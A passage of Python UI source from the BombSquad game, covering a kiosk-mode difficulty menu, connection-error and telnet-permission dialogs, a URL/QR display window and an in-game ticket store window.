            parent=self._rootWidget, autoSelect=True, size=(bWidth, bHeight),
            onActivateCall=bs.Call(self._doGame, 'easy'),
            transitionDelay=tDelay, position=(h - bWidth * 0.5, bV),
            label='', buttonType='square')
        bs.textWidget(parent=self._rootWidget, drawController=b,
                      transitionDelay=tDelay, size=(0, 0),
                      position=(h, labelHeight), maxWidth=bWidth*0.7,
                      text=bs.Lstr(resource=self._r+'.easyText'),
                      scale=1.3, hAlign='center', vAlign='center')
        b = bs.imageWidget(
            parent=self._rootWidget, drawController=b,
            size=(imgWidth, 0.5 * imgWidth),
            transitionDelay=tDelay, position=(h - imgWidth * 0.5, imgV),
            texture=bs.getTexture('doomShroomPreview'),
            modelOpaque=modelOpaque, modelTransparent=modelTransparent,
            maskTexture=maskTex)
        h = self._width*0.5
        tDelay = tDelayBase+tDelayScale*650
        self._b2 = b = bs.buttonWidget(
            parent=self._rootWidget, autoSelect=True, size=(bWidth, bHeight),
            onActivateCall=bs.Call(self._doGame, 'medium'),
            position=(h - bWidth * 0.5, bV),
            label='', buttonType='square', transitionDelay=tDelay)
        bs.textWidget(parent=self._rootWidget, drawController=b,
                      transitionDelay=tDelay,
                      size=(0, 0), position=(h, labelHeight),
                      maxWidth=bWidth*0.7,
                      text=bs.Lstr(resource=self._r+'.mediumText'),
                      scale=1.3, hAlign='center', vAlign='center')
        b = bs.imageWidget(
            parent=self._rootWidget, drawController=b,
            size=(imgWidth, 0.5 * imgWidth),
            transitionDelay=tDelay, position=(h - imgWidth * 0.5, imgV),
            texture=bs.getTexture('footballStadiumPreview'),
            modelOpaque=modelOpaque, modelTransparent=modelTransparent,
            maskTexture=maskTex)
        h = self._width*0.5+bSpace
        tDelay = tDelayBase+tDelayScale*600
        self._b3 = b = bs.buttonWidget(
            parent=self._rootWidget, autoSelect=True, size=(bWidth, bHeight),
            onActivateCall=bs.Call(self._doGame, 'hard'),
            transitionDelay=tDelay, position=(h - bWidth * 0.5, bV),
            label='', buttonType='square')
        bs.textWidget(parent=self._rootWidget, drawController=b,
                      transitionDelay=tDelay, size=(0, 0),
                      position=(h, labelHeight),
                      maxWidth=bWidth * 0.7, text='Hard', scale=1.3,
                      hAlign='center', vAlign='center')
        b = bs.imageWidget(
            parent=self._rootWidget, drawController=b, transitionDelay=tDelay,
            size=(imgWidth, 0.5 * imgWidth),
            position=(h - imgWidth * 0.5, imgV),
            texture=bs.getTexture('courtyardPreview'),
            modelOpaque=modelOpaque, modelTransparent=modelTransparent,
            maskTexture=maskTex)
        tDelayBase = 0
        tDelayScale = 0
        if gDidMenuIntro == False:
            tDelayBase = 1500
            tDelayScale = 1.0
            gDidMenuIntro = True

        yExtra = -115
        bWidth = 250
        bHeight = 200
        bSpace = 280
        bV = 80+yExtra
        labelHeight = 130+yExtra
        imgWidth = 180
        imgV = 158+yExtra

        tDelay = tDelayBase+tDelayScale*1300

        if False:
            bs.textWidget(
                parent=self._rootWidget, size=(0, 0),
                position=(self._width * 0.5, self._height + yExtra - 44),
                transitionDelay=tDelay, text=bs.Lstr(
                    resource=self._r + '.versusExamplesText'),
                flatness=1.0, scale=1.2, hAlign='center', vAlign='center',
                shadow=1.0)
            h = self._width*0.5-bSpace
            tDelay = tDelayBase+tDelayScale*700
            self._b4 = b = bs.buttonWidget(
                parent=self._rootWidget, autoSelect=True, size=(bWidth,
                                                                bHeight),
                onActivateCall=bs.Call(self._doGame, 'ctf'),
                transitionDelay=tDelay, position=(h - bWidth * 0.5, bV),
                label='', buttonType='square')
            bs.textWidget(
                parent=self._rootWidget, drawController=b,
                transitionDelay=tDelay, size=(0, 0),
                position=(h, labelHeight),
                maxWidth=bWidth * 0.7, text=bs.Lstr(
                    translate=('gameNames', 'Capture the Flag')),
                scale=1.3, hAlign='center', vAlign='center')
            b = bs.imageWidget(
                parent=self._rootWidget, drawController=b,
                size=(imgWidth, 0.5 * imgWidth),
                transitionDelay=tDelay, position=(h - imgWidth * 0.5, imgV),
                texture=bs.getTexture('bridgitPreview'),
                modelOpaque=modelOpaque, modelTransparent=modelTransparent,
                maskTexture=maskTex)

            h = self._width*0.5
            tDelay = tDelayBase+tDelayScale*650
            self._b5 = b = bs.buttonWidget(
                parent=self._rootWidget, autoSelect=True, size=(bWidth,
                                                                bHeight),
                onActivateCall=bs.Call(self._doGame, 'hockey'),
                position=(h - bWidth * 0.5, bV),
                label='', buttonType='square', transitionDelay=tDelay)
            bs.textWidget(
                parent=self._rootWidget, drawController=b,
                transitionDelay=tDelay, size=(0, 0),
                position=(h, labelHeight),
                maxWidth=bWidth * 0.7, text=bs.Lstr(
                    translate=('gameNames', 'Hockey')),
                scale=1.3, hAlign='center', vAlign='center')
            b = bs.imageWidget(
                parent=self._rootWidget, drawController=b,
                size=(imgWidth, 0.5 * imgWidth),
                transitionDelay=tDelay, position=(h - imgWidth * 0.5, imgV),
                texture=bs.getTexture('hockeyStadiumPreview'),
                modelOpaque=modelOpaque, modelTransparent=modelTransparent,
                maskTexture=maskTex)
            h = self._width*0.5+bSpace
            tDelay = tDelayBase+tDelayScale*600
            self._b6 = b = bs.buttonWidget(
                parent=self._rootWidget, autoSelect=True, size=(bWidth,
                                                                bHeight),
                onActivateCall=bs.Call(self._doGame, 'epic'),
                transitionDelay=tDelay, position=(h - bWidth * 0.5, bV),
                label='', buttonType='square')
            bs.textWidget(
                parent=self._rootWidget, drawController=b,
                transitionDelay=tDelay, size=(0, 0),
                position=(h, labelHeight),
                maxWidth=bWidth * 0.7, text=bs.Lstr(
                    resource=self._r + '.epicModeText'),
                scale=1.3, hAlign='center', vAlign='center')
            b = bs.imageWidget(
                parent=self._rootWidget, drawController=b,
                transitionDelay=tDelay, size=(imgWidth, 0.5 * imgWidth),
                position=(h - imgWidth * 0.5, imgV),
                texture=bs.getTexture('tipTopPreview'),
                modelOpaque=modelOpaque, modelTransparent=modelTransparent,
                maskTexture=maskTex)
        else:
            self._b4 = self._b5 = self._b6 = None

        bWidth = 150
        tDelay = tDelayBase+tDelayScale*(1300 if self._showMultiplayer else 200)
        if False:
            self._b7 = bs.buttonWidget(
                parent=self._rootWidget, autoSelect=True, size=(bWidth, 50),
                color=(0.45, 0.55, 0.45),
                textColor=(0.7, 0.8, 0.7),
                scale=0.5,
                position=((self._width * 0.5 - 37.5, yExtra + 120)
                          if not self._showMultiplayer
                          else(
                              self._width + 100, yExtra +
                              (140 if gSmallUI else 120))),
                transitionDelay=tDelay, label=bs.Lstr(
                    resource=self._r + '.fullMenuText'),
                onActivateCall=self._doFullMenu)
        else:
            self._b7 = None
        self._restore_state()

        self._update()
        self._updateTimer = bs.Timer(1000, bs.WeakCall(self._update),
                                     timeType='real', repeat=True)

    def _restore_state(self):
        try:
            selName = gWindowStates[self.__class__.__name__]
        except Exception:
            selName = None
        if selName == 'b1':
            sel = self._b1
        elif selName == 'b2':
            sel = self._b2
        elif selName == 'b3':
            sel = self._b3
        elif selName == 'b4':
            sel = self._b4
        elif selName == 'b5':
            sel = self._b5
        elif selName == 'b6':
            sel = self._b6
        elif selName == 'b7':
            sel = self._b7
        else:
            sel = self._b1
        bs.containerWidget(edit=self._rootWidget, selectedChild=sel)

    def _save_state(self):
        sel = self._rootWidget.getSelectedChild()
        if sel == self._b1:
            selName = 'b1'
        elif sel == self._b2:
            selName = 'b2'
        elif sel == self._b3:
            selName = 'b3'
        elif sel == self._b4:
            selName = 'b4'
        elif sel == self._b5:
            selName = 'b5'
        elif sel == self._b6:
            selName = 'b6'
        elif sel == self._b7:
            selName = 'b7'
        else:
            selName = 'b1'
        gWindowStates[self.__class__.__name__] = selName

    def _update(self):
        # kiosk-mode is designed to be used signed-out... try for force
        # the issue
        if bsInternal._getAccountState() == 'SIGNED_IN':
            # bsInternal._signOut()
            # FIXME - try to delete player profiles here too
            pass
        else:
            # also make sure there's no player profiles
            bsConfig = bs.getConfig()
            bsConfig['Player Profiles'] = {}

    def _doGame(self, mode):
        self._save_state()
        if mode in ['epic', 'ctf', 'hockey']:
            bsConfig = bs.getConfig()
            if 'Team Tournament Playlists' not in bsConfig:
                bsConfig['Team Tournament Playlists'] = {}
            if 'Free-for-All Playlists' not in bsConfig:
                bsConfig['Free-for-All Playlists'] = {}
            bsConfig['Show Tutorial'] = False
            if mode == 'epic':
                bsConfig['Free-for-All Playlists']['Just Epic Elim'] = [
                    {
                        'settings': {
                            'Epic Mode': 1,
                            'Lives Per Player': 1,
                            'Respawn Times': 1.0,
                            'Time Limit': 0,
                            'map': 'Tip Top'
                        },
                        'type': 'bsElimination.EliminationGame'
                    }
                ]
                bsConfig['Free-for-All Playlist Selection'] = 'Just Epic Elim'
                bsInternal._fadeScreen(
                    False, time=250, endCall=bs.Call(
                        bs.pushCall, bs.Call(
                            bsInternal._newHostSession, bs.FreeForAllSession)))
            else:
                if mode == 'ctf':
                    bsConfig['Team Tournament Playlists']['Just CTF'] = [
                        {
                            'settings': {
                                'Epic Mode': False,
                                'Flag Idle Return Time': 30,
                                'Flag Touch Return Time': 0,
                                'Respawn Times': 1.0,
                                'Score to Win': 3,
                                'Time Limit': 0,
                                'map': 'Bridgit'
                            },
                            'type': 'bsCaptureTheFlag.CTFGame'
                        }
                    ]
                    bsConfig['Team Tournament Playlist Selection'] = 'Just CTF'
                else:
                    bsConfig['Team Tournament Playlists']['Just Hockey'] = [
                        {
                            'settings': {
                                'Respawn Times': 1.0,
                                'Score to Win': 1,
                                'Time Limit': 0,
                                'map': 'Hockey Stadium'
                            },
                            'type': 'bsHockey.HockeyGame'
                        }
                    ]
                    bsConfig['Team Tournament Playlist Selection'] = \
                        'Just Hockey'
                bsInternal._fadeScreen(
                    False, time=250, endCall=bs.Call(
                        bs.pushCall, bs.Call(
                            bsInternal._newHostSession, bs.TeamsSession)))
            bs.containerWidget(edit=self._rootWidget, transition='outLeft')
            return

        game = ('Easy:Onslaught Training' if mode == 'easy'
                else 'Easy:Rookie Football' if mode == 'medium'
                else 'Easy:Uber Onslaught')
        bs.getConfig()['Selected Coop Game'] = game
        bs.writeConfig()
        if bsUtils._handleRunChallengeGame(game, force=True):
            bs.containerWidget(edit=self._rootWidget, transition='outLeft')

    def _doFullMenu(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        global gDidMenuIntro
        gDidMenuIntro = True  # prevent delayed transition-in
        uiGlobals['mainMenuWindow'] = MainMenuWindow().getRootWidget()


class LocalConnectFailMessageWindow(Window):
    def __init__(self):
        width = 670
        height = 270
        bs.playSound(bs.getSound('error'))
        self._rootWidget = bs.containerWidget(
            size=(width, height), transition='inRight')
        t = bs.textWidget(
            parent=self._rootWidget, position=(15, height - 55),
            size=(width - 30, 30),
            text=("Fatal Error:\n\n" +
                  "BombSquad is unable to connect to itself on socket port " +
                  str(bsInternal._getGamePort()) + ".\n" +
                  "It may be getting blocked by security "
                  "software such as 'Hands Off!'.\n\n"
                  + "Change your your settings to allow BombSquad to\n" +
                  "host connections on port " + str(
                      bsInternal._getGamePort()) + " and and try again.\n\n" +
                  "If this does not work, email "
                  "support@froemling.net for help."),
            color=(1, 0.6, 0.2, 1),
            scale=0.8, hAlign="center", vAlign="top")
        b = bs.buttonWidget(
            parent=self._rootWidget, position=((width - 160) / 2, 10),
            size=(160, 50),
            label="Quit", onActivateCall=bs.quit)
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)


def _onDeviceMenuPress(device):
    inMainMenu = (
        uiGlobals['mainMenuWindow']
        is not None and uiGlobals['mainMenuWindow'].exists())
    if not inMainMenu:
        bsInternal._setUIInputDevice(device)
        bs.playSound(bs.getSound('swish'))
        uiGlobals['mainMenuWindow'] = MainMenuWindow().getRootWidget()


def handleTelnetAccessRequest():

    class _TelnetAccessWindow(Window):

        def __init__(self):
            width = 400
            height = 100
            text = bs.Lstr(resource='telnetAccessText')

            self._rootWidget = bs.containerWidget(
                size=(width, height + 40),
                transition='inRight', scale=1.7
                if gSmallUI else 1.3 if gMedUI else 1.0)
            padding = 20
            t = bs.textWidget(
                parent=self._rootWidget, position=(padding, padding + 33),
                size=(width - 2 * padding, height - 2 * padding),
                hAlign="center", vAlign="top", text=text)
            b = bs.buttonWidget(
                parent=self._rootWidget, position=(20, 20),
                size=(140, 50),
                label=bs.Lstr(resource='denyText'),
                onActivateCall=self._cancel)
            bs.containerWidget(edit=self._rootWidget, cancelButton=b)
            bs.containerWidget(edit=self._rootWidget, selectedChild=b)

            b = bs.buttonWidget(
                parent=self._rootWidget, position=(width - 155, 20),
                size=(140, 50),
                label=bs.Lstr(resource='allowText'),
                onActivateCall=self._ok)

        def _cancel(self):
            bs.containerWidget(edit=self._rootWidget, transition='outRight')
            bsInternal._setTelnetAccessEnabled(False)

        def _ok(self):
            bs.containerWidget(edit=self._rootWidget, transition='outLeft')
            bsInternal._setTelnetAccessEnabled(True)
            bs.screenMessage(bs.Lstr(resource='telnetAccessGrantedText'))

    _TelnetAccessWindow()


class ShowURLWindow(Window):
    "Gets called by BombSquad when it is unable to bring up a browser"

    def __init__(self, address):

        # on alibaba show qr codes; otherwise just print the url
        env = bs.getEnvironment()
        if env['platform'] == 'android' and env['subplatform'] == 'alibaba':
            self._width = 500
            self._height = 500
            self._rootWidget = bs.containerWidget(
                size=(self._width, self._height),
                transition='inRight', scale=1.25
                if gSmallUI else 1.25 if gMedUI else 1.25)
            self._cancelButton = bs.buttonWidget(
                parent=self._rootWidget, position=(50, self._height - 30),
                size=(50, 50),
                scale=0.6, label='', color=(0.6, 0.5, 0.6),
                onActivateCall=self._done, autoSelect=True, icon=bs.getTexture(
                    'crossOut'),
                iconScale=1.2)
            qrSize = 400
            iw2 = bs.imageWidget(
                parent=self._rootWidget,
                position=(self._width * 0.5 - qrSize * 0.5, self._height * 0.5 -
                          qrSize * 0.5),
                size=(qrSize, qrSize),
                texture=bsInternal._getQRCodeTexture(address))
            bs.containerWidget(edit=self._rootWidget,
                               cancelButton=self._cancelButton)
            pass
        else:

            self._width = 800
            self._height = 200
            self._rootWidget = bs.containerWidget(
                size=(self._width, self._height + 40),
                transition='inRight', scale=1.25
                if gSmallUI else 1.25 if gMedUI else 1.25)
            t = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.5, self._height - 10),
                size=(0, 0),
                color=gTitleColor, hAlign="center", vAlign="center",
                text=bs.Lstr(resource='directBrowserToURLText'),
                maxWidth=self._width * 0.95)
            t = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.5, self._height * 0.5 + 29),
                size=(0, 0),
                scale=1.3, color=gInfoTextColor, hAlign="center",
                vAlign="center", text=address, maxWidth=self._width * 0.95)
            buttonWidth = 200
            b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(self._width * 0.5 - buttonWidth * 0.5, 20),
                size=(buttonWidth, 65),
                label=bs.Lstr(resource='doneText'),
                onActivateCall=self._done)
            # we have no 'cancel' button but still want to be able to
            # hit back/escape/etc to leave..
            bs.containerWidget(
                edit=self._rootWidget, selectedChild=b, startButton=b,
                onCancelCall=b.activate)

    def _done(self):
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')


class GetTicketsWindow(Window):

    def __init__(
            self, transition='inRight', fromModalStore=False, modal=False,
            originWidget=None, storeBackLocation=None):

        bsInternal._setAnalyticsScreen('Get Tickets Window')

        self._transitioningOut = False
        self._storeBackLocation = storeBackLocation  # ew.

        self._adButtonGreyed = False

        # if they provided an origin-widget, scale up from that
        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        self._width = 1000 if gSmallUI else 800
        xInset = 100 if gSmallUI else 0
        self._height = 480

        self._modal = modal
        self._fromModalStore = fromModalStore
        self._r = 'getTicketsWindow'

        topExtra = 20 if gSmallUI else 0

        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height + topExtra),
            transition=transition, scaleOriginStackOffset=scaleOrigin,
            color=(0.4, 0.37, 0.55),
            scale=1.63 if gSmallUI else 1.2 if gMedUI else 1.0,
            stackOffset=(0, -3) if gSmallUI else(0, 0))

        backButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(55 + xInset, self._height - 79),
            size=(140, 60),
            scale=1.0, autoSelect=True, label=bs.Lstr(
                resource='doneText' if modal else 'backText'),
            buttonType='regular' if modal else 'back', onActivateCall=self.
            _back)

        bs.containerWidget(edit=self._rootWidget, cancelButton=b)

        t = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 55),
            size=(0, 0),
            color=gTitleColor, scale=1.2, hAlign="center", vAlign="center",
            text=bs.Lstr(resource=self._r + '.titleText'),
            maxWidth=290)

        if gDoAndroidNav and not modal:
            bs.buttonWidget(
                edit=b, buttonType='backSmall', size=(60, 60),
                label=bs.getSpecialChar('back'))

        bSize = (220.0, 180.0)
        bSize2 = (220, 180)
        v = self._height - bSize[1] - 80
        spacing = 1

        self._adButton = None

        def _addButton(
                item, position, size, label, price=None, texName=None,
                texOpacity=1.0, texScale=1.0, enabled=True, textScale=1.0):
            b = bs.buttonWidget(
                parent=self._rootWidget, position=position, buttonType='square',
                size=size, label='', autoSelect=True, color=None
                if enabled else(0.5, 0.5, 0.5),
                onActivateCall=(bs.Call(self._purchase, item)
                                if enabled else self._disabledPress))
            t = bs.textWidget(
                parent=self._rootWidget, text=label,
                position=(position[0] + size[0] * 0.5,
                          position[1] + size[1] * 0.3),
                scale=textScale, maxWidth=size[0] * 0.75, size=(0, 0),
                hAlign='center', vAlign='center', drawController=b,
                color=(0.7, 0.9, 0.7, 1.0 if enabled else 0.2))
            if price is not None and enabled:
                bs.textWidget(
                    parent=self._rootWidget, text=price,
                    position=(position[0] + size[0] * 0.5, position[1] + size
                              [1] * 0.17),
                    scale=0.7, maxWidth=size[0] * 0.75, size=(0, 0),
                    hAlign='center', vAlign='center', drawController=b,
                    color=(0.4, 0.9, 0.4, 1.0))
            if texName is not None:
                texSize = 90.0*texScale
                i = bs.imageWidget(
                    parent=self._rootWidget, texture=bs.getTexture(texName),
                    position=(position[0] + size[0] * 0.5 - texSize * 0.5,
                              position[1] + size[1] * 0.66 - texSize * 0.5),
                    size=(texSize, texSize),
                    drawController=b, opacity=texOpacity *
                    (1.0 if enabled else 0.25))
            if item == 'ad':
                self._adButton = b
                self._adLabel = t
                self._adImage = i
                self._adTimeText = bs.textWidget(
                    parent=self._rootWidget, text='1m 10s',
                    position=(position[0] + size[0] * 0.5, position[1] + size
                              [1] * 0.5),
                    scale=textScale * 1.2, maxWidth=size[0] * 0.85, size=(0, 0),
                    hAlign='center', vAlign='center', drawController=b,
                    color=(0.4, 0.9, 0.4, 1.0))
            return b

        r = self._r+'.ticketsText'

        c1Txt = bs.Lstr(resource=r, subs=[('${COUNT}', str(
            bsInternal._getAccountMiscReadVal('tickets1Amount', 50)))])
        c2Txt = bs.Lstr(resource=r, subs=[('${COUNT}', str(
            bsInternal._getAccountMiscReadVal('tickets2Amount', 500)))])
        c3Txt = bs.Lstr(resource=r, subs=[('${COUNT}', str(
            bsInternal._getAccountMiscReadVal('tickets3Amount', 1500)))])
        c4Txt = bs.Lstr(resource=r, subs=[('${COUNT}', str(
            bsInternal._getAccountMiscReadVal('tickets4Amount', 5000)))])
        c5Txt = bs.Lstr(resource=r, subs=[('${COUNT}', str(
            bsInternal._getAccountMiscReadVal('tickets5Amount', 15000)))])

        h = 110

        # enable buttons if we have prices..
        tickets1Price = bsInternal._getPrice('tickets1')
        tickets2Price = bsInternal._getPrice('tickets2')
        tickets3Price = bsInternal._getPrice('tickets3')
        tickets4Price = bsInternal._getPrice('tickets4')
        tickets5Price = bsInternal._getPrice('tickets5')

        # TEMP
        # tickets1Price = '$0.99'
        # tickets2Price = '$4.99'
        # tickets3Price = '$9.99'
        # tickets4Price = '$19.99'
        # tickets5Price = '$49.99'

        c1b = _addButton(
            'tickets2', enabled=(tickets2Price is not None),
            position=(
                self._width * 0.5 - spacing * 1.5 - bSize[0] * 2.0 + h, v),
            size=bSize, label=c2Txt,
            price=tickets2Price, texName='ticketsMore')  # 0.99-ish
        c2b = _addButton(
            'tickets3', enabled=(tickets3Price is not None),
            position=(
                self._width * 0.5 - spacing * 0.5 - bSize[0] * 1.0 + h, v),
            size=bSize, label=c3Txt, price=tickets3Price,
            texName='ticketRoll')  # 4.99-ish
        v -= bSize[1]-5
        c3b = _addButton(
            'tickets4', enabled=(tickets4Price is not None),
            position=(
                self._width * 0.5 - spacing * 1.5 - bSize[0] * 2.0 + h, v),
            size=bSize, label=c4Txt, price=tickets4Price,
            texName='ticketRollBig', texScale=1.2)  # 9.99-ish
        c4b = _addButton(
            'tickets5', enabled=(tickets5Price is not None),
            position=(
                self._width * 0.5 - spacing * 0.5 - bSize[0] * 1.0 + h, v),
            size=bSize, label=c5Txt, price=tickets5Price, texName='ticketRolls',
            texScale=1.2)  # 19.99-ish

        env = bs.getEnvironment()
        self._enableAdButton = bsInternal._hasVideoAds()
        h = self._width*0.5+110
        v = self._height - bSize[1] - 115

        if self._enableAdButton:
            hOffs = 35
            bSize3 = (150, 120)
            cdb = _addButton(
                'ad', position=(h + hOffs, v),
                size=bSize3, label=bs.Lstr(
                    resource=self._r + '.ticketsFromASponsorText',
                    subs=[('${COUNT}',
                           str(
                               bsInternal._getAccountMiscReadVal(
                                   'sponsorTickets', 5)))]),
                texName='ticketsMore', enabled=self._enableAdButton,
                texOpacity=0.6, texScale=0.7, textScale=0.7)
            bs.buttonWidget(
                edit=cdb, color=(0.65, 0.5, 0.7)
                if self._enableAdButton else(0.5, 0.5, 0.5))

            self._adFreeText = bs.textWidget(
                parent=self._rootWidget, text=bs.Lstr(
                    resource=self._r + '.freeText'),
                position=(h + hOffs + bSize3[0] * 0.5,
                          v + bSize3[1] * 0.5 + 25),
                size=(0, 0),
                color=(1, 1, 0, 1.0)
                if self._enableAdButton else(1, 1, 1, 0.2), drawController=cdb,
                rotate=15, shadow=1.0, maxWidth=150, hAlign='center',
                vAlign='center', scale=1.0)
            tcYOffs = 0
            v -= 125
        else:
            v -= 20
            tcYOffs = 0

        if True:
            hOffs = 35
            bSize3 = (150, 120)
            cdb = _addButton(
                'appInvite', position=(h + hOffs, v),
                size=bSize3, label=bs.Lstr(
                    resource='gatherWindow.earnTicketsForRecommendingText',
                    subs=[('${COUNT}',
                           str(
                               bsInternal._getAccountMiscReadVal(
                                   'sponsorTickets', 5)))]),
                texName='ticketsMore', enabled=True, texOpacity=0.6,
                texScale=0.7, textScale=0.7)
            bs.buttonWidget(edit=cdb, color=(0.65, 0.5, 0.7))

            bs.textWidget(
                parent=self._rootWidget, text=bs.Lstr(
                    resource=self._r + '.freeText'),
                position=(h + hOffs + bSize3[0] * 0.5,
                          v + bSize3[1] * 0.5 + 25),
                size=(0, 0),
                color=(1, 1, 0, 1.0),
                drawController=cdb, rotate=15, shadow=1.0, maxWidth=150,
                hAlign='center', vAlign='center', scale=1.0)
            tcYOffs = 0

        h = self._width-(185+xInset)
        v = self._height - 95+tcYOffs

        t1 = bs.Lstr(resource=self._r+'.youHaveText')\
               .evaluate().split('${COUNT}')[0].strip()
        t2 = bs.Lstr(
            resource=self._r+'.youHaveText')\
               .evaluate().split('${COUNT}')[-1].strip()

        bs.textWidget(
            parent=self._rootWidget, text=t1, position=(h, v),
            size=(0, 0),
            color=(0.5, 0.5, 0.6),
            maxWidth=200, hAlign='center', vAlign='center', scale=0.8)
        v -= 30
        self._ticketCountText = bs.textWidget(
            parent=self._rootWidget, position=(h, v), size=(0, 0),
            color=(0.2, 1.0, 0.2),
            maxWidth=200, hAlign='center', vAlign='center', scale=1.6)
        v -= 30
        bs.textWidget(
            parent=self._rootWidget, text=t2, position=(h, v),
            size=(0, 0),
            color=(0.5, 0.5, 0.6),
            maxWidth=200, hAlign='center', vAlign='center', scale=0.8)

        # update count now and once per second going forward..
        self._tickingNode = None
        self._smoothTicketCount = None
        self._ticketCount = 0
        self._update()
        self._updateTimer = bs.Timer(
            1000, bs.WeakCall(self._update),
            timeType='real', repeat=True)
        self._smoothIncreaseSpeed = 1.0

    def __del__(self):
        if self._tickingNode is not None:
            self._tickingNode.delete()
            self._tickingNode = None

    def _smoothUpdate(self):
        if not self._ticketCountText.exists():
            self._smoothUpdateTimer = None
            return

        finished = False

        # if we're going down, do it immediately
        if int(self._smoothTicketCount) >= self._ticketCount:
            self._smoothTicketCount = float(self._ticketCount)
            finished = True
        else:
            # we're going up; start a sound if need be
            self._smoothTicketCount = min(
                self._smoothTicketCount + 1.0 * self._smoothIncreaseSpeed,
                self._ticketCount)
            if int(self._smoothTicketCount) >= self._ticketCount:
                finished = True
                self._smoothTicketCount = float(self._ticketCount)
            elif self._tickingNode is None:
                with bs.Context('UI'):
                    self._tickingNode = bs.newNode(
                        'sound',
                        attrs={'sound': bs.getSound('scoreIncrease'),
                               'positional': False})

        bs.textWidget(
            edit=self._ticketCountText, text=str(
                int(self._smoothTicketCount)))

        # if we've reached the target, kill the timer/sound/etc
        if finished:
            self._smoothUpdateTimer = None
            if self._tickingNode is not None:
                self._tickingNode.delete()
                self._tickingNode = None
                bs.playSound(bs.getSound('cashRegister2'))

    def _update(self):
        import datetime

        # if we somehow get signed out, just die..
        if bsInternal._getAccountState() != 'SIGNED_IN':
            self._back()
            return

        self._ticketCount = bsInternal._getAccountTicketCount()

        # update our incentivized ad button depending on whether ads are
        # available
        if self._adButton is not None:
            nextRewardAdTime = bsInternal._getAccountMiscReadVal2(
                'nextRewardAdTime',
                None)
            if nextRewardAdTime is not None:
                nextRewardAdTime = datetime.datetime.utcfromtimestamp(
                    nextRewardAdTime)
            now = datetime.datetime.utcnow()

            if bsInternal._haveIncentivizedAd() and(
                    nextRewardAdTime is None or nextRewardAdTime <= now):
                self._adButtonGreyed = False
                bs.buttonWidget(edit=self._adButton, color=(0.65, 0.5, 0.7))
                bs.textWidget(edit=self._adLabel, color=(0.7, 0.9, 0.7, 1.0))
                bs.textWidget(edit=self._adFreeText, color=(1, 1, 0, 1))
                bs.imageWidget(edit=self._adImage, opacity=0.6)
                bs.textWidget(edit=self._adTimeText, text='')
            else:
                self._adButtonGreyed = True
                bs.buttonWidget(edit=self._adButton, color=(0.5, 0.5, 0.5))
                bs.textWidget(edit=self._adLabel, color=(0.7, 0.9, 0.7, 0.2))
                bs.textWidget(edit=self._adFreeText, color=(1, 1, 0, 0.2))
                bs.imageWidget(edit=self._adImage, opacity=0.6*0.25)
                if nextRewardAdTime is not None and nextRewardAdTime > now:
                    s = bsUtils.getTimeString(
                        (nextRewardAdTime - now).total_seconds() * 1000.0,
                        centi=False)
                else:
                    s = ''
                bs.textWidget(edit=self._adTimeText, text=s)

        # if this is our first update, assign immediately; otherwise kick
        # off a smooth transition if the value has changed
        if self._smoothTicketCount is None:
            self._smoothTicketCount = float(self._ticketCount)
            self._smoothUpdate()  # will set the text widget

        elif (self._ticketCount != self._smoothTicketCount
              and self._smoothUpdateTimer is None):
            self._smoothUpdateTimer = bs.Timer(
                50, bs.WeakCall(self._smoothUpdate),
                repeat=True, timeType='real')
            diff = abs(float(self._ticketCount)-self._smoothTicketCount)
            self._smoothIncreaseSpeed = (
                diff/100.0 if diff >= 5000 else diff / 50.0 if diff >= 1500
                else diff/30.0 if diff >= 500 else diff/15.0)

    def _disabledPress(self):

        # if we're on a platform without purchases, inform the user they
        # can link their accounts and buy stuff elsewhere
        env = bs.getEnvironment()
        if ((env['testBuild'] or (
                env['platform'] == 'android'
                and env['subplatform'] in ['oculus', 'cardboard']))
            and bsInternal._getAccountMiscReadVal('allowAccountLinking2',
                                                  False)):
            bs.screenMessage(
                bs.Lstr(resource=self._r + '.unavailableLinkAccountText'),
                color=(1, 0.5, 0))
        else:
            bs.screenMessage(
                bs.Lstr(resource=self._r + '.unavailableText'),
                color=(1, 0.5, 0))
        bs.playSound(bs.getSound('error'))

    def _purchase(self, item):
        if item == 'appInvite':
            if bsInternal._getAccountState() != 'SIGNED_IN':
                showSignInPrompt()
                return
            doAppInvitesPress()
            return
        # here we ping the server to ask if it's valid for us to purchase this..
        # (better to fail now than after we've paid locally)
        env = bs.getEnvironment()
        bsUtils.serverGet(
            'bsAccountPurchaseCheck',
            {'item': item, 'platform': env['platform'],
             'subplatform': env['subplatform'],
             'version': env['version'],
             'buildNumber': env['buildNumber']},
            callback=bs.WeakCall(self._purchaseCheckResult, item))

    def _purchaseCheckResult(self, item, result):
        if result is None:
            bs.playSound(bs.getSound('error'))
            bs.screenMessage(
                bs.Lstr(resource='internal.unavailableNoConnectionText'),
                color=(1, 0, 0))
        else:
            if result['allow']:
                self._doPurchase(item)
            else:
                if result['reason'] == 'versionTooOld':
                    bs.playSound(bs.getSound('error'))
                    bs.screenMessage(
                        bs.Lstr(
                            resource='getTicketsWindow.versionTooOldText'),
                        color=(1, 0, 0))
                else:
                    bs.playSound(bs.getSound('error'))
                    bs.screenMessage(
                        bs.Lstr(
                            resource='getTicketsWindow.unavailableText'),
                        color=(1, 0, 0))

    # actually start the purchase locally..
    def _doPurchase(self, item):
        if item == 'ad':
            import datetime
            # if ads are disabled until some time, error..
            nextRewardAdTime = bsInternal._getAccountMiscReadVal2(
                'nextRewardAdTime',
                None)
            if nextRewardAdTime is not None:
                nextRewardAdTime = datetime.datetime.utcfromtimestamp(
                    nextRewardAdTime)
            now = datetime.datetime.utcnow()
            if ((nextRewardAdTime is not None and nextRewardAdTime > now)
                    or self._adButtonGreyed):
                bs.playSound(bs.getSound('error'))
                bs.screenMessage(
                    bs.Lstr(
                        resource='getTicketsWindow.unavailableTemporarilyText'),
                    color=(1, 0, 0))
            elif self._enableAdButton:
                bsUtils._showAd('tickets')
        else:
            bsInternal._purchase(item)

    def _back(self):
